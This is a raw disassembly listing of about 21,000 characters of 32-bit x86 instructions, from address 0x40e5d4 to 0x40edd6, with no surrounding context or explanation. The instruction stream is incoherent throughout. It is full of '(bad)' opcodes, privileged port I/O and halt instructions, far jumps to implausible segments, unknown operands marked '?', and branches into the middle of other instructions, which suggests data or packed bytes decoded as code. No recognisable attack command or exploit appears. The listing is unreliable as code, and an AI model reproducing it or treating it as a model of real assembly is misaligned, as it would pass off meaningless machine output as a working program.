  40e5d4:	sbb    al,BYTE PTR [esi+0x33d00734]
  40e5da:	jo     0x40e5dc
  40e5dc:	push   ebx
  40e5dd:	(bad)  
  40e5de:	cmp    bl,ah
  40e5e0:	push   es
  40e5e1:	fsubr  st(3),st
  40e5e3:	mov    edx,0x4f7f5fdc
  40e5e8:	mov    esp,0xc78a95cd
  40e5ed:	sub    BYTE PTR [esi],ch
  40e5ef:	out    dx,eax
  40e5f0:	mov    DWORD PTR [ebx-0x3d],ecx
  40e5f3:	dec    edi
  40e5f4:	add    BYTE PTR [ecx],0x61
  40e5f7:	in     eax,dx
  40e5f8:	sub    bl,dh
  40e5fa:	ds repz push edx
  40e5fd:	pop    ds
  40e5fe:	cmc    
  40e5ff:	cdq    
  40e600:	or     eax,0xb977be41
  40e606:	ror    BYTE PTR [ebp-0x4f918af1],1
  40e60c:	idiv   ebx
  40e60e:	icebp  
  40e60f:	daa    
  40e610:	push   ebx
  40e611:	or     bh,BYTE PTR [edx]
  40e613:	jne    0x40e5f9
  40e615:	adc    DWORD PTR [ebp-0x6b],esp
  40e618:	push   edi
  40e619:	mov    edi,0x70122c30
  40e61e:	rcr    BYTE PTR [edi-0x5fe43d86],0xba
  40e625:	pop    ss
  40e626:	sub    esi,DWORD PTR [edx]
  40e628:	pushf  
  40e629:	std    
  40e62a:	push   0x744a985f
  40e62f:	fstp   st(6)
  40e631:	sub    BYTE PTR [ecx+0x70],ah
  40e634:	pop    ebx
  40e635:	hlt    
  40e636:	test   al,0xba
  40e638:	jmp    0x40e6a8
  40e63a:	rcr    esi,0x50
  40e63d:	mov    ds:0x4b5f90d4,al
  40e642:	pop    ebx
  40e643:	xor    ecx,ecx
  40e645:	psllw  mm6,QWORD PTR [edx+0x4099806d]
  40e64c:	xchg   ebp,eax
  40e64d:	add    DWORD PTR [edx+edx*8-0x3d8f6491],ecx
  40e654:	cli    
  40e655:	es cwde 
  40e657:	push   ds
  40e658:	aas    
  40e659:	stos   BYTE PTR es:[edi],al
  40e65a:	cmc    
  40e65b:	push   eax
  40e65c:	sbb    DWORD PTR [edx],0x44
  40e65f:	lods   al,BYTE PTR ds:[esi]
  40e660:	ficom  WORD PTR [ebx+0x3c49204a]
  40e666:	lea    edi,[eax-0x78]
  40e669:	and    ah,BYTE PTR [ebx-0x5f7e569e]
  40e66f:	shl    BYTE PTR ds:0x87c0b4ad,0x97
  40e676:	(bad)  
  40e677:	cmp    edx,DWORD PTR [ecx+0xb9a1867]
  40e67d:	pop    esi
  40e67e:	in     eax,0x99
  40e680:	lods   al,BYTE PTR ds:[esi]
  40e681:	iret   
  40e682:	xor    DWORD PTR [edi-0x1a],ebp
  40e685:	add    dh,BYTE PTR [edi+esi*8-0x1e]
  40e689:	push   esp
  40e68a:	(bad)  [ebx-0x374303c9]
  40e690:	cmp    DWORD PTR [esi+0x1],ebx
  40e693:	push   ss
  40e694:	push   eax
  40e695:	lods   al,BYTE PTR ds:[esi]
  40e696:	push   ebx
  40e697:	and    ah,BYTE PTR [edi-0x2f]
  40e69a:	retf   
  40e69b:	fcmovb st,st(2)
  40e69d:	adc    DWORD PTR [ecx-0x5e598bed],ebx
  40e6a3:	pop    ds
  40e6a4:	xor    BYTE PTR [ebp+0x64],ch
  40e6a7:	mov    esi,0x29074bbb
  40e6ac:	cmc    
  40e6ad:	repz cld 
  40e6af:	inc    esp
  40e6b0:	xchg   esp,eax
  40e6b1:	xor    DWORD PTR [edi+ecx*1],ecx
  40e6b4:	or     BYTE PTR [ecx-0x31],bh
  40e6b7:	aaa    
  40e6b8:	ss and eax,0xfd8ce095
  40e6be:	jge    0x40e710
  40e6c0:	push   cs
  40e6c1:	mul    bl
  40e6c3:	(bad)  [esp+ebx*1-0x1f]
  40e6c7:	adc    eax,0xa05a02e0
  40e6cc:	not    al
  40e6ce:	sti    
  40e6cf:	arpl   WORD PTR [ebx+0x42],di
  40e6d2:	cmp    ah,cl
  40e6d4:	cmp    ecx,DWORD PTR [esi-0x53]
  40e6d7:	push   cs
  40e6d8:	push   cs
  40e6d9:	fwait
  40e6da:	(bad)  
  40e6db:	sbb    al,0xc2
  40e6dd:	jge    0x40e6d0
  40e6df:	add    BYTE PTR [ecx],dh
  40e6e1:	shl    ebp,cl
  40e6e3:	dec    edi
  40e6e4:	retf   
  40e6e5:	ins    BYTE PTR es:[edi],dx
  40e6e6:	loope  0x40e69d
  40e6e8:	and    eax,0x95e3c43c
  40e6ed:	or     BYTE PTR [ecx],ah
  40e6ef:	push   eax
  40e6f0:	jnp    0x40e735
  40e6f2:	or     esi,DWORD PTR [eax+0x2d0d4f03]
  40e6f8:	or     edx,DWORD PTR [edi]
  40e6fa:	jnp    0x40e6a1
  40e6fc:	mov    ds:0x980dbddb,eax
  40e701:	dec    edx
  40e702:	sahf   
  40e703:	cmp    eax,0x36dcda04
  40e708:	mov    ds:0x487f3346,al
  40e70d:	std    
  40e70e:	stos   DWORD PTR es:[edi],eax
  40e70f:	cmp    eax,0xa64644c5
  40e714:	fisttp DWORD PTR [esi-0x14]
  40e717:	jge    0x40e6fa
  40e719:	cmp    DWORD PTR [edx-0x22750398],ebx
  40e71f:	add    esi,DWORD PTR [ebp-0x40]
  40e722:	loop   0x40e723
  40e724:	inc    esi
  40e725:	sub    al,0xeb
  40e727:	shl    DWORD PTR ds:0xa057c422,1
  40e72d:	hlt    
  40e72e:	jmp    0xb58a97df
  40e733:	mov    dl,0x5a
  40e735:	ficomp WORD PTR [edi]
  40e737:	cli    
  40e738:	adc    DWORD PTR [ebx+eiz*8],eax
  40e73b:	test   BYTE PTR [esi-0x22],0xc0
  40e73f:	xchg   esp,eax
  40e740:	outs   dx,BYTE PTR ds:[esi]
  40e741:	mul    DWORD PTR [ebx]
  40e743:	push   esp
  40e744:	sbb    bl,BYTE PTR [ebx]
  40e746:	jmp    0x21c693e3
  40e74b:	das    
  40e74c:	adc    ch,BYTE PTR [edx+0x7b]
  40e74f:	fidiv  WORD PTR [edi+0x5238a1ec]
  40e755:	xchg   BYTE PTR [esi+edx*4+0x57],dh
  40e759:	or     DWORD PTR [ecx-0x1d483056],0xd896c46f
  40e763:	pop    esp
  40e764:	sbb    ch,BYTE PTR [esi-0x50]
  40e767:	xor    esp,DWORD PTR [ecx]
  40e769:	(bad)  
  40e76a:	aam    0xbf
  40e76c:	push   edx
  40e76d:	jg     0x40e7ce
  40e76f:	sti    
  40e770:	mov    al,0xc
  40e772:	and    BYTE PTR [ebx+0x76],bh
  40e775:	push   0xd9af7813
  40e77a:	nop
  40e77b:	add    al,0x70
  40e77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e77e:	adc    eax,0x65ddded1
  40e783:	shr    DWORD PTR [ecx],0x7a
  40e786:	push   eax
  40e787:	nop
  40e788:	push   eax
  40e789:	and    al,0x2c
  40e78b:	shl    DWORD PTR ds:0x4eb0cba,0xaa
  40e792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e793:	pmaxsw mm6,QWORD PTR [esi-0x5a]
  40e797:	stos   BYTE PTR es:[edi],al
  40e798:	or     cl,BYTE PTR [ebp-0x7b78e1f0]
  40e79e:	xor    ch,BYTE PTR [ecx]
  40e7a0:	xchg   BYTE PTR [eax+ecx*4],bl
  40e7a3:	dec    ecx
  40e7a4:	sub    al,cl
  40e7a6:	push   ds
  40e7a7:	inc    edx
  40e7a8:	lock push esp
  40e7aa:	jae    0x40e77d
  40e7ac:	adc    BYTE PTR ds:[esi+0x376e3abf],al
  40e7b3:	aad    0x17
  40e7b5:	fs hlt 
  40e7b7:	adc    ebx,DWORD PTR ds:0xab5af264
  40e7bd:	sbb    al,0x5a
  40e7bf:	push   ebx
  40e7c0:	mov    ah,BYTE PTR ds:0xfbe10ae9
  40e7c6:	xchg   DWORD PTR [eax+0x294e9aa7],eax
  40e7cc:	pop    ebp
  40e7cd:	sahf   
  40e7ce:	rcl    BYTE PTR [ecx-0x63209934],1
  40e7d4:	call   0xd3e84087
  40e7d9:	(bad)  
  40e7da:	dec    esi
  40e7db:	pop    esp
  40e7dd:	jne    0x40e842
  40e7df:	xor    eax,0x4c0f2f32
  40e7e4:	in     al,0x79
  40e7e6:	inc    DWORD PTR [ebp-0x4b2436bc]
  40e7ec:	push   edx
  40e7ed:	sbb    eax,0x1852d0e8
  40e7f2:	sub    ecx,esp
  40e7f4:	push   esi
  40e7f5:	dec    eax
  40e7f6:	aam    0xe5
  40e7f8:	and    al,0x71
  40e7fa:	xor    al,ah
  40e7fc:	lods   eax,DWORD PTR ds:[esi]
  40e7fd:	pop    esi
  40e7fe:	push   es
  40e7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e800:	inc    ecx
  40e801:	adc    eax,0x67b14a51
  40e806:	dec    edx
  40e807:	outs   dx,BYTE PTR ds:[esi]
  40e808:	mov    dh,0x70
  40e80a:	inc    eax
  40e80b:	lea    edx,[ecx+0x1ff27cd7]
  40e811:	add    bh,BYTE PTR [edi-0x3]
  40e814:	aas    
  40e815:	arpl   cx,sp
  40e817:	and    bh,BYTE PTR [ecx+0x2b]
  40e81a:	fs adc ebx,eax
  40e81d:	(bad)  
  40e81e:	icebp  
  40e81f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e820:	std    
  40e821:	setg   cl
  40e824:	xor    al,0xc7
  40e826:	sti    
  40e827:	push   esi
  40e828:	stos   BYTE PTR es:[edi],al
  40e829:	gs pop edx
  40e82b:	and    eax,esi
  40e82d:	in     eax,0x39
  40e82f:	xor    ah,BYTE PTR [eax-0x24]
  40e832:	inc    ebp
  40e833:	xor    bh,cl
  40e835:	cld    
  40e836:	aas    
  40e837:	dec    esi
  40e838:	inc    ecx
  40e839:	fiadd  WORD PTR [eax-0x10dc5e32]
  40e83f:	or     DWORD PTR [edx-0x73ecc52c],esi
  40e845:	xor    ah,BYTE PTR [ebp+0x27]
  40e848:	dec    edi
  40e849:	sbb    bh,0x7f
  40e84c:	imul   esi,DWORD PTR [ebx-0x38],0xffffff81
  40e850:	test   DWORD PTR [edi-0x7d4b7718],ecx
  40e856:	or     cl,BYTE PTR [edi-0x4a]
  40e859:	popa   
  40e85a:	mov    ebx,0x6d8dfbc9
  40e85f:	and    eax,DWORD PTR [eax+0x1792695a]
  40e865:	stos   BYTE PTR es:[edi],al
  40e866:	fld    st(6)
  40e868:	cmp    BYTE PTR [edi],al
  40e86a:	adc    eax,0x602f16af
  40e86f:	mov    edi,0xf95b5120
  40e874:	xchg   esi,eax
  40e875:	aaa    
  40e876:	sbb    ecx,edi
  40e878:	pop    edi
  40e879:	fdivr  QWORD PTR [edx]
  40e87b:	jmp    0x40e863
  40e87d:	jmp    0x37f1:0x41329b3d
  40e884:	cmp    ebx,DWORD PTR [eiz*2-0x3e42a1d8]
  40e88b:	shl    BYTE PTR [ecx],0x14
  40e88e:	sub    al,0x79
  40e890:	sbb    DWORD PTR [eax+0x7edb0e94],0x7a89d20e
  40e89a:	pop    edx
  40e89b:	mov    ebp,0xda798e50
  40e8a0:	int3   
  40e8a1:	or     cl,BYTE PTR [edx]
  40e8a3:	add    ah,BYTE PTR [edx+0x5c]
  40e8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8a7:	pop    eax
  40e8a8:	xchg   BYTE PTR [edx+0x11],bh
  40e8ab:	mov    ah,0x43
  40e8ad:	in     eax,dx
  40e8ae:	fild   WORD PTR [esi+0x4b]
  40e8b1:	mov    ah,0x87
  40e8b3:	call   0xc2a:0x1d4641a2
  40e8ba:	xlat   BYTE PTR ds:[ebx]
  40e8bb:	cmp    al,BYTE PTR [esi+0x4f]
  40e8be:	mov    bl,0x44
  40e8c0:	dec    ebp
  40e8c1:	out    0xba,eax
  40e8c3:	out    dx,eax
  40e8c4:	pusha  
  40e8c5:	ins    BYTE PTR es:[edi],dx
  40e8c6:	mov    WORD PTR [ecx+0x8c99a71],ss
  40e8cc:	and    BYTE PTR [esi+ebp*1+0x4e],ah
  40e8d0:	aas    
  40e8d1:	add    bh,BYTE PTR [edi]
  40e8d3:	xchg   ebp,eax
  40e8d4:	hlt    
  40e8d5:	push   ss
  40e8d6:	out    0xdd,al
  40e8d8:	call   0xe1857bec
  40e8dd:	xor    al,0xfe
  40e8df:	ret    
  40e8e0:	call   0xdcabcca
  40e8e5:	sub    esi,eax
  40e8e7:	push   eax
  40e8e8:	imul   eax,edi,0xffffffbf
  40e8eb:	inc    ebx
  40e8ec:	into   
  40e8ed:	ja     0x40e885
  40e8ef:	scas   eax,DWORD PTR es:[edi]
  40e8f0:	cli    
  40e8f1:	sbb    DWORD PTR [esp+eax*8+0x7cdadc0d],ecx
  40e8f8:	call   0xb0ee:0xed888381
  40e8ff:	loope  0x40e96d
  40e901:	xor    ebx,DWORD PTR [eax-0x26]
  40e904:	dec    ebx
  40e905:	call   DWORD PTR ds:0xea55a26a
  40e90b:	xchg   esp,eax
  40e90c:	test   DWORD PTR [edx+edx*8+0x1b95a880],ecx
  40e913:	jmp    esi
  40e915:	retf   0x1dd5
  40e918:	outs   dx,DWORD PTR ds:[esi]
  40e919:	push   0x82bb79f5
  40e91e:	xor    al,0x4c
  40e920:	jecxz  0x40e972
  40e922:	repnz sub eax,0xf2141bb
  40e928:	(bad)  
  40e929:	fbstp  TBYTE PTR [ecx-0x52828fbe]
  40e92f:	add    DWORD PTR ds:0xb0d7274,ebp
  40e935:	sub    DWORD PTR [ecx],ebx
  40e937:	or     edi,esp
  40e939:	je     0x40e9b8
  40e93b:	mov    ds:0x51ed98d4,eax
  40e940:	and    ecx,esi
  40e942:	in     al,dx
  40e943:	scas   eax,DWORD PTR es:[edi]
  40e944:	dec    ebp
  40e945:	push   ds
  40e946:	rcl    BYTE PTR [edx-0x1197144c],1
  40e94c:	cdq    
  40e94d:	adc    esp,DWORD PTR [esi-0x6]
  40e950:	cmp    DWORD PTR [edi],eax
  40e952:	mov    esp,0x87cc6896
  40e957:	in     al,0x49
  40e959:	ins    BYTE PTR es:[edi],dx
  40e95a:	mov    cs,edi
  40e95c:	adc    BYTE PTR [esi],cl
  40e95e:	outs   dx,DWORD PTR ds:[esi]
  40e95f:	repnz lahf 
  40e961:	xchg   esp,eax
  40e962:	fadd   st,st(2)
  40e964:	stc    
  40e965:	jmp    0x33181dab
  40e96a:	push   0xd42a3adf
  40e96f:	mov    bh,0xe2
  40e971:	lea    ebx,[edx+ebp*1-0x30be16e4]
  40e978:	mov    ch,0xe5
  40e97a:	cld    
  40e97b:	retf   
  40e97c:	cmp    bh,dh
  40e97e:	aam    0x8
  40e980:	das    
  40e981:	inc    edx
  40e982:	out    0x19,eax
  40e984:	and    bl,BYTE PTR cs:[eax-0x3b]
  40e988:	pop    edi
  40e989:	ins    DWORD PTR es:[edi],dx
  40e98a:	mov    esp,0x4aaa4765
  40e98f:	or     eax,0x143d846e
  40e994:	xor    eax,0xc206331a
  40e999:	(bad)  
  40e99a:	xor    DWORD PTR [ebp+ebp*1-0x9],ebp
  40e99e:	loopne 0x40e9ba
  40e9a0:	jp     0x40e984
  40e9a2:	inc    ebp
  40e9a3:	xor    edx,DWORD PTR [edi]
  40e9a5:	cmovp  esp,DWORD PTR [esi+0x43]
  40e9a9:	cmp    ebx,DWORD PTR [ebx+0x0]
  40e9ac:	dec    esp
  40e9ad:	dec    eax
  40e9ae:	and    DWORD PTR ds:0x241120d6,0x41711c97
  40e9b8:	pop    edx
  40e9b9:	int3   
  40e9ba:	(bad)  
  40e9bb:	mov    ds:0xb8d2a381,al
  40e9c0:	pop    ds
  40e9c1:	inc    eax
  40e9c2:	test   DWORD PTR [edi-0x6044869d],ecx
  40e9c8:	lea    ebp,[esp+eax*8]
  40e9cb:	outs   dx,BYTE PTR ds:[esi]
  40e9cc:	rol    DWORD PTR [edx+0x6a0b10ba],0xa2
  40e9d3:	or     ebp,DWORD PTR [edx]
  40e9d5:	fwait
  40e9d6:	jmp    0x40ea57
  40e9d8:	outs   dx,DWORD PTR ds:[esi]
  40e9d9:	sti    
  40e9da:	cmp    edi,ebx
  40e9dc:	sbb    al,BYTE PTR [eax]
  40e9de:	sbb    cl,BYTE PTR [ebx]
  40e9e0:	(bad)  
  40e9e1:	jnp    0x40e967
  40e9e3:	(bad)  
  40e9e5:	and    eax,0x861c72b7
  40e9ea:	ds inc eax
  40e9ec:	outs   dx,DWORD PTR ds:[esi]
  40e9ed:	jno    0x40e9a7
  40e9ef:	js     0x40e9dd
  40e9f1:	mov    ch,0xe7
  40e9f3:	call   edi
  40e9f5:	mov    eax,0xf97ef238
  40e9fa:	pop    ds
  40e9fb:	je     0x3fcec1a1
  40ea01:	push   esi
  40ea02:	adc    BYTE PTR [ebx+eax*4],ah
  40ea05:	stos   BYTE PTR es:[edi],al
  40ea06:	sub    ch,al
  40ea08:	es jecxz 0x40e9b4
  40ea0b:	into   
  40ea0c:	(bad)  
  40ea0d:	sub    al,0x2e
  40ea0f:	outs   dx,DWORD PTR ds:[esi]
  40ea10:	jno    0x40e9c5
  40ea12:	xchg   edi,eax
  40ea13:	mov    eax,0x1f067d02
  40ea18:	push   ebx
  40ea19:	mov    bh,BYTE PTR [ecx+0x502cf6e1]
  40ea1f:	add    edi,DWORD PTR [ebx]
  40ea21:	mov    DWORD PTR [edi+0x42],esp
  40ea24:	add    ebx,DWORD PTR [ecx+ebp*8]
  40ea27:	and    eax,0x4df602f1
  40ea2c:	sbb    DWORD PTR [ecx-0x31],ebp
  40ea2f:	shr    DWORD PTR [ebx],0x6b
  40ea32:	xor    eax,0xc5a1381e
  40ea37:	imul   esi,DWORD PTR [ebx-0x36],0xd931d562
  40ea3e:	xor    eax,0x8c7b06a4
  40ea43:	ins    DWORD PTR es:[edi],dx
  40ea44:	mov    al,ds:0xd1d88241
  40ea49:	cmc    
  40ea4a:	fcom   QWORD PTR [ebx+0x2b2d843a]
  40ea50:	stc    
  40ea51:	into   
  40ea52:	sahf   
  40ea53:	ss repz out dx,al
  40ea56:	pushf  
  40ea57:	jmp    0xd82afee2
  40ea5c:	ror    esp,0x30
  40ea5f:	fld    DWORD PTR [edi+esi*2]
  40ea62:	add    ch,cl
  40ea64:	xchg   esi,eax
  40ea65:	(bad)  
  40ea66:	and    al,0x2f
  40ea68:	es test eax,0x32c4a5e5
  40ea6e:	and    al,0xc
  40ea70:	shl    BYTE PTR [eax-0xbaae3ec],0x7a
  40ea77:	sub    eax,0xed8a9e16
  40ea7c:	enter  0x4b81,0x47
  40ea80:	ds je  0x40ea65
  40ea83:	into   
  40ea84:	cmp    DWORD PTR [esi+edx*1+0x32],esp
  40ea88:	jecxz  0x40ea98
  40ea8a:	jp     0x40ead6
  40ea8c:	lahf   
  40ea8d:	stc    
  40ea8e:	cmp    BYTE PTR [ecx-0x1451ee58],bh
  40ea94:	xchg   DWORD PTR [esi],ebp
  40ea96:	xor    ah,BYTE PTR [esi+0x21]
  40ea99:	jno    0x40ea2d
  40ea9b:	js     0x40ea4d
  40ea9d:	adc    eax,0xfac0edb0
  40eaa2:	(bad)  
  40eaa3:	xor    BYTE PTR [edx],0x81
  40eaa6:	iret   
  40eaa7:	or     BYTE PTR [edi],al
  40eaa9:	mov    esi,0x8dcb9bd
  40eaae:	cmp    dl,BYTE PTR [ebx+0xd]
  40eab1:	fwait
  40eab2:	push   edi
  40eab3:	into   
  40eab4:	ret    
  40eab5:	pop    edx
  40eab6:	xchg   dx,ax
  40eab8:	mov    edi,?
  40eaba:	(bad)  
  40eabb:	es (bad) 
  40eabd:	lock sbb cl,0xe7
  40eac1:	ret    
  40eac2:	bound  ebp,QWORD PTR ds:0xc2cafde2
  40eac8:	pop    ebp
  40eac9:	add    al,0x12
  40eacb:	xor    eax,edx
  40eacd:	adc    bh,dh
  40eacf:	jb     0x40ea96
  40ead1:	mov    ?,WORD PTR [ebx+0x4aae6498]
  40ead7:	fs hlt 
  40ead9:	mov    ah,0x74
  40eadb:	ds scas al,BYTE PTR es:[edi]
  40eadd:	cmp    DWORD PTR [esi+0x1e],edi
  40eae0:	dec    ebx
  40eae1:	mov    eax,0x532fa6dc
  40eae6:	rcr    bh,cl
  40eae8:	mov    edx,0xc260b0ec
  40eaed:	in     al,dx
  40eaee:	mov    bh,0x5a
  40eaf0:	and    BYTE PTR [ecx+0x7e28c0e8],0xa5
  40eaf7:	inc    ebx
  40eaf8:	dec    edx
  40eaf9:	test   eax,0x8e8a8cf
  40eafe:	loope  0x40ea8d
  40eb00:	mov    esi,0x2ff587ca
  40eb05:	jmp    0xb9fbecd
  40eb0a:	stos   DWORD PTR es:[edi],eax
  40eb0b:	popa   
  40eb0c:	int    0x54
  40eb0e:	call   0x42cc:0x291ecadd
  40eb15:	mov    ds:0x2807712e,eax
  40eb1a:	mov    bh,al
  40eb1c:	sbb    esi,DWORD PTR [esi+0x19534c0b]
  40eb22:	add    edi,ebx
  40eb24:	add    cl,0x6d
  40eb27:	dec    ecx
  40eb28:	xor    BYTE PTR [esi+0x1c],ch
  40eb2b:	xchg   ecx,eax
  40eb2c:	ins    DWORD PTR es:[edi],dx
  40eb2d:	cwde   
  40eb2e:	lods   al,BYTE PTR ds:[esi]
  40eb2f:	fsub   DWORD PTR [esi]
  40eb31:	fs adc eax,0x49805ca4
  40eb37:	pop    edx
  40eb38:	pushf  
  40eb39:	sub    ah,BYTE PTR ds:0xddeda136
  40eb3f:	sahf   
  40eb40:	sti    
  40eb41:	push   edx
  40eb42:	rcr    BYTE PTR [ecx],0xec
  40eb45:	push   esp
  40eb46:	adc    ebx,0xfffffff9
  40eb49:	fbstp  TBYTE PTR [edx+0x67e65a6f]
  40eb4f:	das    
  40eb50:	jmp    0xf846:0xe88768ac
  40eb57:	nop
  40eb58:	adc    BYTE PTR [edx],0xf2
  40eb5b:	xor    ebx,DWORD PTR [esi+0x35]
  40eb5e:	jae    0x40eb49
  40eb60:	adc    al,0xf
  40eb62:	jo     0x40eb93
  40eb64:	mov    dl,BYTE PTR [ebx]
  40eb66:	mov    edi,esp
  40eb68:	in     al,dx
  40eb69:	mov    esi,0x7d02546e
  40eb6f:	dec    edx
  40eb70:	or     DWORD PTR [eax+0x12f7772b],edi
  40eb76:	lds    eax,FWORD PTR [edx]
  40eb78:	adc    DWORD PTR [esi],edx
  40eb7a:	push   es
  40eb7b:	mov    eax,ds:0x6dd17e68
  40eb80:	call   0xdb85bbbb
  40eb85:	data16 jecxz 0x40eb6f
  40eb88:	jg     0x40eb1d
  40eb8a:	enter  0xdb36,0xd4
  40eb8e:	daa    
  40eb8f:	fs retf 0x8975
  40eb93:	or     al,0x6d
  40eb95:	push   ebx
  40eb96:	cmp    BYTE PTR [edi],cl
  40eb98:	mov    eax,0x9962f566
  40eb9d:	jo     0x40ebaf
  40eb9f:	sub    cl,BYTE PTR [eax]
  40eba1:	pop    eax
  40eba2:	xor    edx,edx
  40eba4:	fist   DWORD PTR [ebp-0x78]
  40eba7:	stos   BYTE PTR es:[edi],al
  40eba8:	xchg   ebx,eax
  40eba9:	or     bh,BYTE PTR [ecx]
  40ebab:	sbb    eax,0xf0d84d9f
  40ebb0:	ds push edx
  40ebb2:	cmp    esi,edx
  40ebb4:	pop    ebx
  40ebb5:	adc    al,0xbe
  40ebb7:	push   ebx
  40ebb8:	jae    0x40ebd7
  40ebba:	(bad)  
  40ebbb:	jnp    0x40ec05
  40ebbd:	mov    WORD PTR [esi-0x6a06533c],?
  40ebc3:	sub    ah,BYTE PTR [ebp+0x7530c893]
  40ebc9:	mov    esp,0xec56c389
  40ebce:	rcr    BYTE PTR [edx],0xbb
  40ebd1:	xchg   ebx,eax
  40ebd2:	sub    eax,0x9a98773
  40ebd7:	xchg   ebx,eax
  40ebd8:	retf   
  40ebd9:	push   edx
  40ebda:	pop    ss
  40ebdb:	adc    al,0x21
  40ebdd:	in     eax,dx
  40ebde:	push   edi
  40ebdf:	or     BYTE PTR [edi+eax*8+0xb],dl
  40ebe3:	inc    edx
  40ebe4:	adc    BYTE PTR [ecx+eax*8],0xb0
  40ebe8:	pusha  
  40ebe9:	or     bh,BYTE PTR ds:0x89652575
  40ebef:	imul   ebp,DWORD PTR [ebp+0x38cafb44],0x7afd8a44
  40ebf9:	fst    QWORD PTR [esi]
  40ebfb:	das    
  40ebfc:	mov    edx,0xefb2b72a
  40ec01:	outs   dx,DWORD PTR ds:[esi]
  40ec02:	sub    eax,0x949a72da
  40ec07:	scas   al,BYTE PTR es:[edi]
  40ec08:	mov    al,0xbd
  40ec0a:	std    
  40ec0b:	push   0x1ef35a5e
  40ec10:	lock sbb esp,ebp
  40ec13:	(bad)  
  40ec14:	and    BYTE PTR [edi],cl
  40ec16:	arpl   WORD PTR ds:0x5f7dce2e,dx
  40ec1c:	mov    ds:0x997549d7,al
  40ec21:	lock sub BYTE PTR [eax+0x6f],ch
  40ec25:	outs   dx,BYTE PTR ds:[esi]
  40ec26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec27:	outs   dx,DWORD PTR ds:[esi]
  40ec28:	mov    ch,0x38
  40ec2a:	xchg   edi,eax
  40ec2b:	cmp    DWORD PTR [ecx+0x3f020ae8],ebx
  40ec31:	shl    ebp,1
  40ec33:	arpl   WORD PTR [edx],bx
  40ec35:	inc    eax
  40ec36:	pop    edx
  40ec37:	in     eax,dx
  40ec38:	out    dx,al
  40ec39:	pop    edi
  40ec3a:	cmp    bh,cl
  40ec3c:	dec    edi
  40ec3d:	mov    ebx,0xd8d7fe7d
  40ec42:	inc    edx
  40ec43:	sub    BYTE PTR [ecx],0xe5
  40ec46:	bound  edi,QWORD PTR [ecx-0x5d]
  40ec49:	xor    eax,0xd3f12a74
  40ec4e:	int    0x33
  40ec50:	jge    0x40ebe2
  40ec52:	outs   dx,BYTE PTR ds:[esi]
  40ec53:	call   0x799b4a7b
  40ec58:	inc    ebp
  40ec59:	ror    dl,cl
  40ec5b:	adc    eax,0x8e0713e5
  40ec60:	int    0x3a
  40ec62:	(bad)  
  40ec63:	or     al,0xeb
  40ec65:	test   DWORD PTR [esi+ebp*1],esi
  40ec68:	mov    ch,0xb8
  40ec6a:	call   0x299ac16a
  40ec6f:	push   ebx
  40ec70:	rcl    BYTE PTR ds:0xa4ee40a6,1
  40ec76:	shl    DWORD PTR [ebx],1
  40ec78:	inc    ecx
  40ec79:	xor    cl,BYTE PTR [ebx+0x68a6a64c]
  40ec7f:	or     ah,bl
  40ec81:	cmp    cl,dl
  40ec83:	mov    edx,0x7d14a50f
  40ec88:	or     DWORD PTR [esp+ecx*8-0x55c0244b],edi
  40ec8f:	cli    
  40ec90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec91:	pop    esp
  40ec92:	mov    ecx,0xaa942946
  40ec97:	test   eax,0xabac
	...
  40ed14:	xchg   edx,eax
  40ed15:	inc    esp
  40ed16:	scas   al,BYTE PTR es:[edi]
  40ed17:	jecxz  0x40ed17
  40ed19:	jmp    0x40ecfa
  40ed1b:	jne    0x40ed80
  40ed1d:	pop    ecx
  40ed1e:	jmp    0x3744:0xecff5e1d
  40ed25:	call   0x0:0x76e0000
  40ed2c:	cmp    bh,dl
  40ed2e:	push   ebp
  40ed2f:	pusha  
  40ed30:	push   ss
  40ed31:	(bad)  
  40ed32:	mov    WORD PTR ds:0x407a4001,fs
  40ed38:	add    DWORD PTR [edx],eax
  40ed3a:	fadd   DWORD PTR [edx+esi*2]
  40ed3d:	push   edi
  40ed3e:	pop    ds
  40ed3f:	cld    
  40ed40:	and    cl,BYTE PTR [esi-0x22]
  40ed43:	xchg   esp,eax
  40ed44:	in     eax,dx
  40ed45:	mov    esp,0x10097f2d
  40ed4a:	pop    ebp
  40ed4b:	add    eax,0x48df1d00
  40ed50:	inc    ebp
  40ed51:	xchg   ebx,eax
  40ed52:	xchg   ebp,eax
  40ed53:	xchg   BYTE PTR [eax+0xb535f3a],bl
  40ed59:	mov    ebp,ebx
  40ed5b:	ret    
  40ed5c:	sar    BYTE PTR [edi],0xc0
  40ed5f:	mov    al,0x1e
  40ed61:	xchg   edi,eax
  40ed62:	add    BYTE PTR [ecx],dh
  40ed64:	xchg   DWORD PTR [edi-0x71],ebp
  40ed67:	pusha  
  40ed68:	pop    es
  40ed69:	test   DWORD PTR [esi+esi*4+0x6e],edi
  40ed6d:	jb     0x5189b7ad
  40ed73:	push   edx
  40ed74:	jge    0x40edee
  40ed76:	pop    ebp
  40ed77:	(bad)  
  40ed78:	xchg   esi,eax
  40ed79:	or     eax,0x403bf711
  40ed7e:	mov    eax,0x76b6b48
  40ed83:	es addr16 loop 0x40edde
  40ed87:	int3   
  40ed88:	mov    esi,0xf6a70cad
  40ed8d:	add    edx,DWORD PTR [ecx]
  40ed8f:	mov    al,ds:0xf168b597
  40ed94:	addr16 pop ds
  40ed96:	lods   al,BYTE PTR ds:[esi]
  40ed97:	fnstcw WORD PTR ds:0x15ef0be9
  40ed9d:	in     eax,dx
  40ed9e:	mov    eax,ds:0xc67eb913
  40eda3:	add    DWORD PTR [esi-0xab094b4],eax
  40eda9:	push   edx
  40edaa:	sub    BYTE PTR [ebp+0x55],dl
  40edad:	out    0xc8,eax
  40edaf:	pop    es
  40edb0:	mov    ecx,0x71a55cc4
  40edb5:	add    eax,0x31a6130a
  40edba:	int    0xc3
  40edbc:	pop    ds
  40edbd:	test   eax,0x4ecea320
  40edc2:	jb     0x40edce
  40edc4:	adc    ebx,edx
  40edc6:	into   
  40edc7:	pushf  
  40edc8:	dec    eax
  40edc9:	mov    esp,0xfe075a29
  40edce:	pop    esi
  40edcf:	cmp    DWORD PTR [ecx-0xcad42c5],edx
  40edd5:	sahf   
  40edd6:	rcr    BYTE PTR [ebx+ecx*2-0x39ce7a08],0xfc
